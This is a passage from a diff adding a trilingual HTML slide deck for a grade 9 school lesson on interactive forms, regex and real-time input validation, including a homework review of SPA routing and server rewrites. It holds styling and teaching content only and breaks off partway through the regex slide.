@@ -1,0 +1,1687 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title data-ru="Урок 34: Формы, Регулярные Выражения и Кибер-Валидация" data-en="Lesson 34: Interactive Forms, Regex & Real-Time Cyber Validation">34-dars: Formalar, Regex va Real-Vaqt Kiber-Validatsiya</title>
+<link rel="icon" type="image/svg+xml" href="../../../../assets/favicon.svg">
+<link rel="alternate icon" type="image/png" sizes="32x32" href="../../../../assets/favicon-32x32.png">
+<link rel="apple-touch-icon" sizes="180x180" href="../../../../assets/apple-touch-icon.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Manrope:wght@500;600;700;800&family=Source+Sans+3:ital,wght@0,400;0,600;0,700;1,400&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+/* ============================================================
+   TARGET INTERNATIONAL SCHOOL — CANONICAL PRESENTATION SYSTEM
+   Dizayn standarti: Minimalist Typographic Glassmorphism UI
+   Sensorli Smartboard, Planshet va Desktop moslashuvi
+   ============================================================ */
+
+:root {
+  --deck-scale: 1;
+  --ink: #00214A;
+  --ink-2: #384A66;
+  --ink-3: #6B7C96;
+  --bg: #F4F7FC;
+  --panel: #FFFFFF;
+  --panel-2: #EAF0F8;
+  --rule: #D5E0EE;
+  --hair: #E2EAF4;
+  --accent: #FF1100;
+  --accent-ink: #C21000;
+  --accent-soft: rgba(255, 17, 0, 0.08);
+  --green: #0B6B4F;
+  --green-soft: #DDF0E8;
+  --purple: #5B21B6;
+  --purple-soft: #EDE9FE;
+  --amber: #B45309;
+  --amber-soft: #FEF3C7;
+  --cyan: #0E7490;
+  --cyan-soft: #CFFAFE;
+  
+  --shadow-dock: 0 12px 36px rgba(0, 33, 74, 0.14), 0 2px 8px rgba(0, 33, 74, 0.06);
+  --shadow-card: 0 4px 18px rgba(0, 33, 74, 0.05);
+  --glass-bg: rgba(255, 255, 255, 0.88);
+  --glass-border: rgba(213, 224, 238, 0.8);
+}
+
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --ink: #EAF1FB;
+    --ink-2: #A5B6CD;
+    --ink-3: #75869D;
+    --bg: #061530;
+    --panel: #0E2249;
+    --panel-2: #16305A;
+    --rule: #1E3A63;
+    --hair: #152B4D;
+    --accent: #FF3B26;
+    --accent-ink: #FF7563;
+    --accent-soft: rgba(255, 59, 38, 0.14);
+    --green: #4ADE80;
+    --green-soft: rgba(74, 222, 128, 0.12);
+    --purple: #C084FC;
+    --purple-soft: rgba(192, 132, 252, 0.12);
+    --amber: #FBBF24;
+    --amber-soft: rgba(251, 191, 36, 0.12);
+    --cyan: #38BDF8;
+    --cyan-soft: rgba(56, 189, 248, 0.12);
+    
+    --shadow-dock: 0 16px 44px rgba(0, 0, 0, 0.45);
+    --shadow-card: 0 6px 22px rgba(0, 0, 0, 0.25);
+    --glass-bg: rgba(14, 34, 73, 0.88);
+    --glass-border: rgba(30, 58, 99, 0.8);
+  }
+}
+
+:root[data-theme="dark"] {
+  --ink: #EAF1FB;
+  --ink-2: #A5B6CD;
+  --ink-3: #75869D;
+  --bg: #061530;
+  --panel: #0E2249;
+  --panel-2: #16305A;
+  --rule: #1E3A63;
+  --hair: #152B4D;
+  --accent: #FF3B26;
+  --accent-ink: #FF7563;
+  --accent-soft: rgba(255, 59, 38, 0.14);
+  --green: #4ADE80;
+  --green-soft: rgba(74, 222, 128, 0.12);
+  --purple: #C084FC;
+  --purple-soft: rgba(192, 132, 252, 0.12);
+  --amber: #FBBF24;
+  --amber-soft: rgba(251, 191, 36, 0.12);
+  --cyan: #38BDF8;
+  --cyan-soft: rgba(56, 189, 248, 0.12);
+  
+  --shadow-dock: 0 16px 44px rgba(0, 0, 0, 0.45);
+  --shadow-card: 0 6px 22px rgba(0, 0, 0, 0.25);
+  --glass-bg: rgba(14, 34, 73, 0.88);
+  --glass-border: rgba(30, 58, 99, 0.8);
+}
+
+* { box-sizing: border-box; }
+html, body {
+  margin: 0;
+  padding: 0;
+  height: 100%;
+  width: 100%;
+  overflow: hidden;
+  background: var(--bg);
+  color: var(--ink);
+  font-family: "Source Sans 3", system-ui, sans-serif;
+  -webkit-font-smoothing: antialiased;
+  touch-action: pan-y;
+  user-select: none;
+}
+
+/* ============================================================
+   TOP FLOATING BRAND PILL (Always accessible, never breaks)
+   ============================================================ */
+.floating-brand {
+  position: fixed;
+  top: 18px;
+  left: 24px;
+  z-index: 100;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 8px 16px;
+  background: var(--glass-bg);
+  backdrop-filter: blur(14px);
+  -webkit-backdrop-filter: blur(14px);
+  border: 1px solid var(--glass-border);
+  border-radius: 999px;
+  box-shadow: var(--shadow-dock);
+  text-decoration: none;
+  transition: transform 0.2s ease, box-shadow 0.2s ease;
+}
+.floating-brand:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 14px 38px rgba(0, 33, 74, 0.18);
+}
+.floating-brand .brand-svg {
+  display: block;
+  height: 24px;
+  width: auto;
+}
+.floating-brand .brand-svg .brand-navy {
+  fill: var(--ink);
+}
+.floating-brand .brand-svg .brand-navy-stroke {
+  stroke: var(--ink);
+  fill: none;
+}
+.floating-brand .brand-svg .brand-red {
+  fill: var(--accent);
+}
+.floating-brand .brand-svg .brand-red-stroke {
+  stroke: var(--accent);
+  fill: none;
+}
+.floating-brand .tag {
+  font-family: "JetBrains Mono", monospace;
+  font-size: 11px;
+  font-weight: 700;
+  letter-spacing: 0.08em;
+  text-transform: uppercase;
+  color: var(--accent-ink);
+  padding: 2px 8px;
+  background: var(--accent-soft);
+  border-radius: 6px;
+}
+
+/* Teacher-only Solution Lock Standard */
+.teacher-solution-only {
+  display: none !important;
+}
+:root[data-show-solutions="true"] .teacher-solution-only {
+  display: inline-flex !important;
+}
+
+/* ============================================================
+   BOTTOM-RIGHT FLOATING GLASS DOCK (Language, Nav, Theme, Notes)
+   ============================================================ */
+.floating-dock {
+  position: fixed;
+  bottom: 20px;
+  right: 24px;
+  left: auto;
+  transform: none;
+  z-index: 100;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  padding: 6px 12px;
+  background: var(--glass-bg);
+  backdrop-filter: blur(16px);
+  -webkit-backdrop-filter: blur(16px);
+  border: 1px solid var(--glass-border);
+  border-radius: 999px;
+  box-shadow: var(--shadow-dock);
+}
+.dock-btn {
+  background: transparent;
+  border: none;
+  color: var(--ink-2);
+  font-family: "JetBrains Mono", monospace;
+  font-size: 13px;
+  font-weight: 700;
+  padding: 6px 10px;
+  border-radius: 999px;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 6px;
+  transition: all 0.18s ease;
+  outline: none;
+  touch-action: manipulation;
+}
+.dock-btn svg {
+  display: block;
+  flex-shrink: 0;
+  pointer-events: none;
+}
+.dock-btn:hover, .dock-btn:focus-visible {
+  background: var(--panel-2);
+  color: var(--ink);
+  transform: translateY(-1px);
+}
+.dock-btn:active {
+  transform: scale(0.96);
+}
+.dock-btn.is-active {
+  background: var(--ink);
+  color: var(--bg);
+}
+.dock-btn.nav-btn {
+  padding: 6px 10px;
+  color: var(--accent);
+}
+.dock-btn.scale-label-btn {
+  font-size: 11px;
+  font-weight: 800;
+  letter-spacing: 0.02em;
+  padding: 5px 8px;
+  min-width: 44px;
+}
+
+/* Counter & Phase Pills */
+.floating-counter {
+  position: fixed;
+  top: 20px;
+  right: 24px;
+  z-index: 100;
+  font-family: "JetBrains Mono", monospace;
+  font-size: 14px;
+  font-weight: 700;
+  color: var(--ink-2);
+  background: var(--glass-bg);
+  backdrop-filter: blur(14px);
+  border: 1px solid var(--glass-border);
+  padding: 6px 16px;
+  border-radius: 999px;
+  box-shadow: var(--shadow-dock);
+}
+.floating-counter .curr {
+  color: var(--accent);
+}
+.floating-phase {
+  position: fixed;
+  bottom: 24px;
+  left: 28px;
+  z-index: 100;
+  font-family: "JetBrains Mono", monospace;
+  font-size: 12px;
+  font-weight: 700;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  color: var(--ink-3);
+  background: var(--glass-bg);
+  backdrop-filter: blur(14px);
+  border: 1px solid var(--glass-border);
+  padding: 6px 14px;
+  border-radius: 999px;
+  box-shadow: var(--shadow-dock);
+}
+
+/* ============================================================
+   TOUCH CONTROLLER & SCREEN EDGE TAP ZONES (Smartboard & Mobile)
+   ============================================================ */
+.screen-edge-nav {
+  position: fixed;
+  top: 50%;
+  transform: translateY(-50%);
+  width: 48px;
+  height: 96px;
+  background: rgba(0, 33, 74, 0.04);
+  border: 1px solid var(--rule);
+  color: var(--ink-2);
+  font-size: 32px;
+  font-weight: 300;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  cursor: pointer;
+  z-index: 85;
+  opacity: 0.35;
+  border-radius: 12px;
+  transition: opacity 0.2s, background 0.2s, transform 0.2s, color 0.2s;
+  user-select: none;
+  touch-action: manipulation;
+}
+.screen-edge-nav:hover, .screen-edge-nav:active {
+  opacity: 0.95;
+  background: var(--panel);
+  color: var(--accent);
+  transform: translateY(-50%) scale(1.08);
+  box-shadow: var(--shadow-dock);
+}
+.screen-edge-nav.prev-edge { left: 14px; }
+.screen-edge-nav.next-edge { right: 14px; }
+@media (max-width: 900px) {
+  .screen-edge-nav { display: none; }
+}
+
+/* ============================================================
+   STAGE & SLIDES LAYOUT
+   ============================================================ */
+.stage {
+  width: 100vw;
+  height: 100vh;
+  position: relative;
+  overflow: hidden;
+}
+.slide {
+  position: absolute;
+  inset: 0;
+  display: none;
+  flex-direction: column;
+  justify-content: center;
+  padding: clamp(60px, 9vh, 90px) clamp(32px, 6vw, 100px);
+  max-width: 1400px;
+  margin: 0 auto;
+  box-sizing: border-box;
+  overflow-y: auto;
+  zoom: var(--deck-scale, 1);
+}
+.slide.is-on {
+  display: flex;
+}
+
+/* Typographic Headings & Elements */
+h1 {
+  font-family: "Manrope", sans-serif;
+  font-size: clamp(34px, 4.8vw, 64px);
+  font-weight: 800;
+  line-height: 1.08;
+  letter-spacing: -0.025em;
+  margin: 0;
+  color: var(--ink);
+}
+h2 {
+  font-family: "Manrope", sans-serif;
+  font-size: clamp(24px, 3.2vw, 42px);
+  font-weight: 800;
+  line-height: 1.15;
+  letter-spacing: -0.02em;
+  margin: 0 0 8px 0;
+  color: var(--ink);
+}
+h3 {
+  font-family: "Manrope", sans-serif;
+  font-size: clamp(16px, 1.8vw, 22px);
+  font-weight: 700;
+  margin: 0 0 6px 0;
+  color: var(--ink);
+}
+p {
+  font-size: clamp(15px, 1.5vw, 18px);
+  line-height: 1.55;
+  margin: 0;
+  color: var(--ink-2);
+}
+.lede {
+  font-size: clamp(17px, 1.8vw, 22px);
+  line-height: 1.5;
+  color: var(--ink-2);
+  max-width: 85ch;
+  margin-top: 8px;
+}
+.eyebrow {
+  font-family: "JetBrains Mono", monospace;
+  font-size: 12px;
+  font-weight: 700;
+  letter-spacing: 0.12em;
+  text-transform: uppercase;
+  color: var(--accent);
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  margin-bottom: 6px;
+}
+.eyebrow::before {
+  content: "";
+  display: inline-block;
+  width: 8px;
+  height: 8px;
+  border-radius: 50%;
+  background: var(--accent);
+}
+
+/* ============================================================
+   GRID CONTAINERS & CARDS
+   ============================================================ */
+.grid {
+  display: grid;
+  gap: clamp(14px, 1.8vw, 24px);
+  margin-top: clamp(16px, 2.2vh, 28px);
+}
+.grid.c2 { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+.grid.c3 { grid-template-columns: repeat(3, minmax(0, 1fr)); }
+.grid.c4 { grid-template-columns: repeat(4, minmax(0, 1fr)); }
+
+@media (max-width: 900px) {
+  .grid.c2, .grid.c3, .grid.c4 { grid-template-columns: 1fr; }
+}
+
+.card {
+  background: var(--panel);
+  border: 1px solid var(--rule);
+  border-radius: 14px;
+  padding: clamp(16px, 2vw, 24px);
+  box-shadow: var(--shadow-card);
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+}
+.card.accent { border-left: 4px solid var(--accent); }
+.card.green { border-left: 4px solid var(--green); }
+.card.purple { border-left: 4px solid var(--purple); }
+.card.amber { border-left: 4px solid var(--amber); }
+
+/* Code Blocks */
+pre.code-block {
+  margin: 0;
+  padding: 14px 18px;
+  background: var(--panel-2);
+  border: 1px solid var(--rule);
+  border-radius: 10px;
+  font-family: "JetBrains Mono", monospace;
+  font-size: clamp(12px, 1.2vw, 14px);
+  line-height: 1.6;
+  color: var(--ink);
+  overflow-x: auto;
+  user-select: text;
+}
+
+/* Interactive Quiz Box */
+.quiz-box {
+  background: var(--panel);
+  border: 1px solid var(--rule);
+  border-radius: 14px;
+  padding: clamp(16px, 2.2vw, 26px);
+  margin-top: 14px;
+  box-shadow: var(--shadow-card);
+}
+.quiz-options {
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+  margin: 14px 0;
+}
+.quiz-opt {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 12px 16px;
+  border: 1px solid var(--rule);
+  border-radius: 10px;
+  background: var(--bg);
+  cursor: pointer;
+  font-size: 15px;
+  font-weight: 600;
+  color: var(--ink);
+  transition: all 0.15s ease;
+  user-select: none;
+}
+.quiz-opt:hover {
+  background: var(--panel-2);
+  border-color: var(--accent);
+}
+.quiz-opt.correct {
+  background: var(--green-soft);
+  border-color: var(--green);
+  color: var(--green);
+}
+.quiz-opt.wrong {
+  background: var(--accent-soft);
+  border-color: var(--accent);
+  color: var(--accent-ink);
+}
+
+.fix-btn {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  padding: 8px 18px;
+  background: var(--accent);
+  color: #FFFFFF;
+  border: none;
+  border-radius: 999px;
+  font-family: "JetBrains Mono", monospace;
+  font-size: 13px;
+  font-weight: 700;
+  cursor: pointer;
+  transition: transform 0.15s ease, background 0.15s ease;
+}
+.fix-btn:hover {
+  transform: translateY(-1px);
+  background: var(--accent-ink);
+}
+.quiz-reveal {
+  display: none;
+  margin-top: 14px;
+  padding: 12px 16px;
+  background: var(--panel-2);
+  border-left: 3px solid var(--green);
+  border-radius: 8px;
+  font-size: 14px;
+  line-height: 1.5;
+}
+
+/* ============================================================
+   TEACHER NOTES DRAWER (N Key)
+   ============================================================ */
+.notes-drawer {
+  position: fixed;
+  bottom: 0;
+  left: 0;
+  right: 0;
+  background: var(--panel);
+  border-top: 3px solid var(--accent);
+  box-shadow: 0 -12px 40px rgba(0, 0, 0, 0.35);
+  padding: 24px 32px;
+  z-index: 200;
+  transform: translateY(105%);
+  transition: transform 0.25s cubic-bezier(0.16, 1, 0.3, 1);
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+  max-height: 45vh;
+  overflow-y: auto;
+}
+.notes-drawer.open {
+  transform: translateY(0);
+}
+.notes-head {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+.notes-title {
+  font-family: "Manrope", sans-serif;
+  font-size: 16px;
+  font-weight: 800;
+  color: var(--ink);
+}
+.notes-content {
+  font-size: 15px;
+  line-height: 1.6;
+  color: var(--ink-2);
+  user-select: text;
+}
+
+/* ============================================================
+   KEYBOARD HELP MODAL (? Key)
+   ============================================================ */
+.modal-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(0, 20, 50, 0.6);
+  backdrop-filter: blur(8px);
+  z-index: 300;
+  display: none;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+}
+.modal-overlay.open {
+  display: flex;
+}
+.modal-card {
+  background: var(--panel);
+  border: 1px solid var(--rule);
+  border-radius: 18px;
+  padding: 28px 32px;
+  max-width: 520px;
+  width: 100%;
+  box-shadow: var(--shadow-dock);
+}
+.help-grid {
+  display: grid;
+  grid-template-columns: auto 1fr;
+  gap: 12px 20px;
+  align-items: center;
+  margin: 18px 0;
+  font-size: 14px;
+}
+kbd {
+  font-family: "JetBrains Mono", monospace;
+  font-weight: 700;
+  background: var(--panel-2);
+  border: 1px solid var(--rule);
+  border-radius: 6px;
+  padding: 4px 8px;
+  color: var(--ink);
+  box-shadow: 0 2px 0 var(--rule);
+}
+</style>
+</head>
+<body>
+
+<!-- TOP FLOATING BRAND PILL (Always works offline & online, auto theme-aware) -->
+<a href="../../../../index.html" class="floating-brand" title="Bosh sahifa / Home" data-title-ru="Главная страница / Home" data-title-en="Home Page">
+  <svg class="brand-svg" viewBox="0 0 738 177" width="128" height="31">
+    <g transform="translate(8, 7) scale(1.70)">
+      <path class="brand-navy-stroke" stroke-width="11.5" stroke-linecap="butt"
+            d="M 54.5 7.9 A 40.5 40.5 0 0 1 88.1 41.5 M 88.1 54.5 A 40.5 40.5 0 0 1 54.5 88.1 M 41.5 88.1 A 40.5 40.5 0 0 1 7.9 54.5 M 7.9 41.5 A 40.5 40.5 0 0 1 41.5 7.9" />
+      <circle class="brand-red-stroke" cx="48" cy="48" r="17.2" stroke-width="7.2" />
+      <rect class="brand-red" x="45.6" y="3" width="4.8" height="28" rx="0.5" />
+      <rect class="brand-red" x="45.6" y="65" width="4.8" height="28" rx="0.5" />
+      <rect class="brand-red" x="3" y="45.6" width="28" height="4.8" rx="0.5" />
+      <rect class="brand-red" x="65" y="45.6" width="28" height="4.8" rx="0.5" />
+      <circle class="brand-navy" cx="48" cy="48" r="7.2" />
+    </g>
+    <text x="198" y="106" font-family="'Manrope', system-ui, sans-serif" font-weight="900" font-size="96" letter-spacing="-0.5">
+      <tspan class="brand-navy">T</tspan><tspan class="brand-red">A</tspan><tspan class="brand-navy">RGET</tspan>
+    </text>
+    <text x="202" y="150" font-family="'Source Sans 3', system-ui, sans-serif" font-weight="700" font-size="24" letter-spacing="7.5" class="brand-navy">INTERNATIONAL SCHOOL</text>
+  </svg>
+  <span class="tag" data-ru="9-КЛАСС" data-en="GRADE 9">9-SINF</span>
+</a>
+
+<!-- COUNTER & PHASE PILLS -->
+<div class="floating-counter" onclick="handleCounterTap()" style="cursor:pointer;" title="O'qituvchi rejimi uchun 3 marta bosing" data-title-ru="Нажмите 3 раза для режима учителя" data-title-en="Triple-tap for Teacher Mode"><span class="curr" id="currSlide">1</span> / <span id="totalSlides">6</span></div>
+<div class="floating-phase" id="phasePill" data-ru="Введение" data-en="Introduction">Kirish</div>
+
+<!-- SCREEN EDGE TAP NAV (For Smartboards, touch displays & fast mouse navigation) -->
+<button class="screen-edge-nav prev-edge" onclick="prevSlide()" aria-label="Previous slide" title="Oldingi slayd (←)" data-title-ru="Предыдущий слайд (←)" data-title-en="Previous slide (←)">‹</button>
+<button class="screen-edge-nav next-edge" onclick="nextSlide()" aria-label="Next slide" title="Keyingi slayd (→)" data-title-ru="Следующий слайд (→)" data-title-en="Next slide (→)">›</button>
+
+<!-- ============================================================
+     SLIDES STAGE
+     ============================================================ -->
+<div class="stage">
+
+  <!-- SLIDE 1: TITUL -->
+  <section class="slide current" data-phase="Kirish|Введение|Intro" data-time="00:00–04:00" data-slide-index="0">
+    <div class="eyebrow"><span class="t" data-ru="9-КЛАСС · 12-Я НЕДЕЛЯ · УРОК 34" data-en="GRADE 9 · WEEK 12 · LESSON 34">9-SINF · 12-HAFTA · 34-DARS</span></div>
+    <h1 class="display" data-ru="Формы, Регулярные Выражения (Regex) и Кибер-Валидация" data-en="Interactive Forms, Regular Expressions (Regex) & Cyber Validation">Formalar, Regex (Muntazam Ifodalar) va Real-Vaqt Kiber-Validatsiya</h1>
+    <p class="lede" data-ru="Интерактивная защита ввода данных в SPA: синтаксис Regex-шаблонов, расчет энтропии паролей, API валидации HTML5 и фильтрация XSS/SQL инъекций в реальном времени." data-en="Real-time input validation & cyber hygiene in SPA: Regex pattern syntax, password entropy calculations, HTML5 Constraint Validation APIs, and live XSS/SQLi sanitization.">SPA ilovalarda ma'lumotlar xavfsizligi: Regex qoliplari sintaksisi, parollar entropiyasini hisoblash, HTML5 Constraint Validation API va real-vaqt rejimida XSS/SQLi inyeksiyalaridan tozalash.</p>
+    <div class="hero-split">
+      <div class="box">
+        <div class="tag" data-ru="Формат урока" data-en="Lesson Format">40 daqiqalik Yakka Dars</div>
+        <h3 data-ru="Магия Regex" data-en="Regex Power">Regex va Entropiya</h3>
+        <p data-ru="Как одной строкой регулярного выражения проверить email, телефон и взломостойкость пароля." data-en="How a single concise regex validates emails, phone patterns, and password strength requirements.">Bitta qisqa Regex qolipi bilan email, telefon va parollarning mustahkamligini xatosiz tekshirish.</p>
+      </div>
+      <div class="box">
+        <div class="tag" data-ru="Ожидаемый результат" data-en="Deliverable">CyberForm Studio</div>
+        <h3 data-ru="Живая Валидация" data-en="Live Validation">Real-Vaqt Kiber-Forma</h3>
+        <p data-ru="Каждый ученик создаст форму регистрации с мгновенной подсветкой ошибок и санитизацией скриптов." data-en="Each student builds a registration form featuring instant error feedback and script sanitization.">Har bir o'quvchi xatolarni yozayotgan paytda ko'rsatuvchi va XSS xakerlik xurujlarini zararsizlantiruvchi forma yasaydi.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- SLIDE 2: MANDATORY HW REVIEW -->
+  <section class="slide" data-phase="Uy Vazifasi Tahlili|Разбор ДЗ|Homework Review" data-time="04:00–08:00" data-slide-index="1">
+    <div class="eyebrow"><span class="t" data-ru="АНАЛИЗ ДОМАШНЕГО ЗАДАНИЯ 33-УРОКА" data-en="LESSON 33 HOMEWORK REVIEW">33-DARS UY VAZIFASI TAHLILI</span></div>
+    <h2 data-ru="SPA и Клиентский Роутинг: Ловушка Ошибки 404 при Перезагрузке (F5)" data-en="SPA Routing: The F5 Page Refresh 404 Trap">SPA Routerning Keng Tarqalgan Xatosi: F5 Bosganda 404 Yiqilishi</h2>
+    <div class="grid-2">
+      <div class="box danger-border">
+        <div class="tag" style="background:rgba(239,68,68,0.15); color:var(--red);" data-ru="Типичная ошибка (Pitfall)" data-en="Common Pitfall">Keng Tarqalgan Xato (Pitfall)</div>
+        <h4 data-ru="Клиентский роутер работает по клику, но падает при F5" data-en="Router functions on click, but crashes upon hard F5 reload">Havola bosilganda ishlaydi, F5 bosganda 404 beradi</h4>
+        <p style="font-size:12px;" data-ru="Ученик настроил `history.pushState('/dashboard')`. Нажимая кнопки в меню, SPA переключается идеально. Но когда страницу обновили (F5), сервер вернул '404 Not Found'! Сервер искал реальную папку `/dashboard/index.html`." data-en="Student configured `history.pushState('/dashboard')`. In-app navigation worked fine, but pressing F5 yielded '404 Not Found'! The backend tried serving non-existent directory `/dashboard/index.html`.">O'quvchi menyu tugmalarini bosganda sahifa 0 ms da ochildi. Ammo F5 bosilganda server "404 Not Found" xatosini berdi! Chunki serverda `/dashboard/index.html` degan fayl yo'q edi.</p>
+        <pre><code class="language-javascript">// ❌ Xato: Faqat mijozda pushState qilib, server sozlanmagan
+history.pushState({}, '', '/dashboard'); // F5 bosilsa 404!</code></pre>
+      </div>
+      <div class="box" style="border:1px solid var(--green);">
+        <div class="tag" style="background:rgba(16,185,129,0.15); color:var(--green);" data-ru="Золотой стандарт (Golden Solution)" data-en="Golden Standard">Oltin Standart Yechim</div>
+        <h4 data-ru="Server Rewrites (SPA Fallback на index.html)" data-en="Server Rewrites (Fallback all routes to index.html)">Server Rewrites: Barcha yo'llarni index.html ga yo'naltirish</h4>
+        <p style="font-size:12px;" data-ru="В Vercel (`vercel.json`) или Nginx настраивается правило перенаправления: любые несуществующие пути отдают корневой `index.html`, а роутер на JS подхватывает `location.pathname`." data-en="Configure Vercel (`vercel.json`) or Nginx rewrite rules: route all path requests to root `index.html` and let the JS router read `location.pathname`.">Vercel yoki Nginx serveriga qoida beriladi: har qanday virtual manzil uchun `index.html` qaytarilsin. Brauzer ichidagi JS router esa o'sha manzilni o'qib kerakli ekranni ochadi.</p>
+        <pre><code class="language-json">// ✅ To'g'ri: vercel.json rewrite qoidasi
+{ "rewrites": [{ "source": "/(.*)", "destination": "/index.html" }] }</code></pre>
+      </div>
+    </div>
+    <div class="grid-2" style="margin-top:10px;">
+      <div class="box">
+        <div class="tag" data-ru="30-секундный Блиц" data-en="30-Sec Blitz">30 Soniyalik Blitz</div>
+        <p style="font-size:11px;" data-ru="Какое событие браузера срабатывает, когда пользователь нажимает кнопку «Назад» в браузере?" data-en="Which browser event fires when the user clicks the browser Back button?">Foydalanuvchi brauzerning "Orqaga" tugmasini bosganda qaysi JavaScript hodisasi ishga tushadi?</p>
+        <div style="font-size:11px; color:var(--accent); font-weight:700;" data-ru="Ответ: window.onpopstate (или window.addEventListener('popstate'))." data-en="Answer: window.onpopstate event.">Javob: window.addEventListener('popstate') hodisasi!</div>
+      </div>
+      <div class="box">
+        <div class="tag" data-ru="Мост к теме 34" data-en="Bridge to Lesson 34">Bugungi Mavzuga Ko'prik</div>
+        <p style="font-size:11px;" data-ru="SPA работает без перезагрузки. Но что происходит, когда пользователь отправляет форму? Стандартный submit перезагрузит страницу! Нам нужна интерактивная валидация." data-en="Our SPA runs smoothly. But traditional forms reload the whole page on submit! We need real-time event-driven validation.">SPA sahifani qayta yuklamaydi. Ammo oddiy forma yuborilsa, sahifa yana qayta yuklanadi! Bizga `preventDefault()` va real-vaqt kiber-validatsiyasi kerak.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- SLIDE 3: WHY CLASSIC FORMS SUCK -->
+  <section class="slide" data-phase="Nazariya|Теория|Theory" data-time="08:00–14:00" data-slide-index="2">
+    <div class="eyebrow"><span class="t" data-ru="ЭВОЛЮЦИЯ ИНТЕРФЕЙСОВ" data-en="UI EVOLUTION">INTERFEYSLAR EVOLYUTSIYASI</span></div>
+    <h2 data-ru="Почему Классические POST-Формы Умерли?" data-en="Why Traditional POST Forms Are Dead">Nega Klassik POST-Formalar Davri Tugadi?</h2>
+    <div class="grid-2">
+      <div class="box danger-border">
+        <div class="tag" style="background:rgba(239,68,68,0.15); color:var(--red);" data-ru="1. Старый Web 1.0 (POST Refresh)" data-en="Old Web 1.0 (POST Refresh)">Klassik Web 1.0 (POST Qayta Yuklash)</div>
+        <p style="font-size:12px; line-height:1.6;" data-ru="1. Пользователь заполняет 10 полей.<br>2. Нажимает «Отправить». Экран мигает белым.<br>3. Сервер через 2 секунды возвращает ошибку «Неверный email».<br>4. Все остальные введенные поля стерлись! Пользователь в ярости." data-en="1. User fills 10 inputs.<br>2. Clicks 'Submit'. Screen flickers white.<br>3. Server responds after 2s: 'Invalid email'.<br>4. All inputs reset to empty! User rage quits.">1. Foydalanuvchi 10 ta maydonni to'ldiradi.<br>2. "Yuborish"ni bosadi. Ekran oq bo'lib qotadi.<br>3. Server 2 soniyadan so'ng: "Email xato" deb qaytaradi.<br>4. Barcha to'ldirilgan maydonlar o'chib ketadi! Foydalanuvchi saytdan chiqib ketadi.</p>
+      </div>
+      <div class="box" style="border:1px solid var(--green);">
+        <div class="tag" style="background:rgba(16,185,129,0.15); color:var(--green);" data-ru="2. Современный SPA (0 ms Реакция)" data-en="Modern SPA (0 ms Real-Time)">Zamonaviy SPA (0 ms Real-Vaqt Reaksiyasi)</div>
+        <p style="font-size:12px; line-height:1.6;" data-ru="1. Пользователь печатает: `e.preventDefault()`.<br>2. Событие <code>input</code> на лету проверяет каждый символ.<br>3. Мгновенная зеленая галочка или понятная подсказка.<br>4. Никаких перезагрузок, данные сохраняются в памяти." data-en="1. Intercept submit via `e.preventDefault()`.<br>2. The <code>input</code> event validates keystrokes in 0 ms.<br>3. Instant dynamic badge: green checkmark or helpful hint.<br>4. Zero reloads, form data preserved in client state.">1. Forma yuborilishi `e.preventDefault()` bilan tutib qolinadi.<br>2. <code>input</code> hodisasi har bir harf kiritilganda 0 ms da tekshiradi.<br>3. Yashil belgi yoki aniq yo'riqnoma darhol chiqadi.<br>4. Sahifa hech qachon qayta yuklanmaydi, ma'lumotlar saqlanadi.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- SLIDE 4: REGEX SYNTAX -->
+  <section class="slide" data-phase="Nazariya|Теория|Theory" data-time="14:00–20:00" data-slide-index="3">
+    <div class="eyebrow"><span class="t" data-ru="СИНТАКСИС ШАБЛОНОВ" data-en="PATTERN SYNTAX">MUNTIZAM IFODALAR (REGEX)</span></div>
+    <h2 data-ru="Анатомия Регулярных Выражений (Regex) в JavaScript" data-en="JavaScript Regular Expressions (Regex) Anatomy">JavaScript-da Regex (Muntazam Ifodalar) Anatomiyasi</h2>
+    <div class="grid-2">
+      <div class="box">
+        <div class="tag" data-ru="Ключевые Метасимволы" data-en="Key Metacharacters">Asosiy Meta-Belgilar</div>
+        <ul style="font-size:12px; line-height:1.7; margin-top:6px;">
+          <li><code>^</code> va <code>$</code> — <span class="t" data-ru="Начало и конец строки (строгое соответствие)" data-en="Start and end of string (strict boundary)">Satrning boshi va oxiri (qat'iy chegara)</span></li>
+          <li><code>\d</code> — <span class="t" data-ru="Любая цифра [0-9]" data-en="Any digit [0-9]">Ixtiyoriy raqam [0-9]</span></li>
+          <li><code>\w</code> — <span class="t" data-ru="Буква, цифра или подчёркивание [a-zA-Z0-9_]" data-en="Word character [a-zA-Z0-9_]">Harf, son yoki pastki chiziqcha</span></li>
+          <li><code>+</code> — <span class="t" data-ru="1 или более повторений" data-en="1 or more occurrences">1 yoki undan ko'p marta uchrash</span></li>
+          <li><code>*</code> — <span class="t" data-ru="0 или более повторений" data-en="0 or more occurrences">0 yoki undan ko'p marta uchrash</span></li>
+          <li><code>{8,}</code> — <span class="t" data-ru="Минимум 8 символов" data-en="Minimum 8 characters">Kamida 8 ta belgi bo'lishi</span></li>
